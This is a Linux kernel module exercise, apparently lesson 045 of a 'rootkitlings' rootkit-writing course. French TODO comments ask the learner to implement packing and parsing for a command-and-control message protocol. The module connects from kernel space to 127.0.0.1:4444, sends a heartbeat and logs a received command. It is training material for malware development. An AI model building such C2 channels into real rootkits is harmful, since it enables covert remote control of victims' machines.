#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/net.h>
#include <linux/in.h>
#include <net/sock.h>
#include <linux/inet.h>
#include <linux/byteorder/generic.h>
#include "protocol.h"

#define SERVER_IP   "127.0.0.1"
#define SERVER_PORT 4444

static struct socket *sock = NULL;

static int ksend(struct socket *s, const void *buf, size_t len)
{
	struct msghdr msg = {0};
	struct kvec vec = { .iov_base = (void *)buf, .iov_len = len };

	return kernel_sendmsg(s, &msg, &vec, 1, len);
}

static int krecv(struct socket *s, void *buf, size_t len)
{
	struct msghdr msg = {0};
	struct kvec vec = { .iov_base = buf, .iov_len = len };

	return kernel_recvmsg(s, &msg, &vec, 1, len, 0);
}

static int pack_message(char *out, __u8 type, const char *data, __u32 data_len)
{
	// TODO(rootkitlings): serialise un message C2 dans le buffer out.
	//
	// Le format: [type (1 octet)] [length (4 octets, big-endian)] [data (length octets)]
	//
	// 1. out[0] = type
	// 2. Convertis data_len en big-endian avec htonl()
	// 3. Copie les 4 octets du length dans out+1 (utilise memcpy)
	// 4. Si data_len > 0, copie data dans out+C2_HEADER_SIZE (utilise memcpy)
	// 5. Retourne C2_HEADER_SIZE + data_len
	//
	// 5 lignes.

	return 0;
}

static int unpack_header(const char *buf, __u8 *type, __u32 *length)
{
	// TODO(rootkitlings): parse un header C2 depuis buf (5 octets).
	//
	// 1. *type = buf[0]
	// 2. Copie les 4 octets buf+1 dans une variable __be32 (utilise memcpy)
	// 3. *length = ntohl(cette variable)
	// 4. Retourne 0
	//
	// 4 lignes.

	return -1;
}

static int __init c2proto_init(void)
{
	struct sockaddr_in addr;
	char send_buf[C2_HEADER_SIZE + C2_MAX_DATA];
	char recv_buf[C2_HEADER_SIZE + C2_MAX_DATA];
	char data_buf[C2_MAX_DATA];
	__u8 msg_type;
	__u32 msg_len;
	int ret, total;

	ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
	if (ret < 0)
		return ret;

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(SERVER_PORT);
	addr.sin_addr.s_addr = in_aton(SERVER_IP);

	ret = kernel_connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
	if (ret < 0) {
		sock_release(sock);
		sock = NULL;
		return ret;
	}

	pr_info("rootkitlings/045: connected\n");

	/* Send heartbeat (no data) */
	total = pack_message(send_buf, C2_HEARTBEAT, NULL, 0);
	if (total > 0) {
		ksend(sock, send_buf, total);
		pr_info("rootkitlings/045: sent heartbeat (%d bytes)\n", total);
	}

	/* Receive command from server */
	ret = krecv(sock, recv_buf, C2_HEADER_SIZE);
	if (ret != C2_HEADER_SIZE) {
		pr_err("rootkitlings/045: failed to read header: %d\n", ret);
		return 0;
	}

	ret = unpack_header(recv_buf, &msg_type, &msg_len);
	if (ret < 0) {
		pr_err("rootkitlings/045: unpack_header failed\n");
		return 0;
	}

	pr_info("rootkitlings/045: header: type=%d length=%u\n", msg_type, msg_len);

	if (msg_len > 0 && msg_len < C2_MAX_DATA) {
		ret = krecv(sock, data_buf, msg_len);
		if (ret > 0) {
			data_buf[ret] = '\0';
			pr_info("rootkitlings/045: command received: %s\n", data_buf);
		}
	}

	return 0;
}

static void __exit c2proto_exit(void)
{
	if (sock) {
		sock_release(sock);
		sock = NULL;
	}
	pr_info("rootkitlings/045: done\n");
}

module_init(c2proto_init);
module_exit(c2proto_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("rootkitlings 045: C2 protocol");
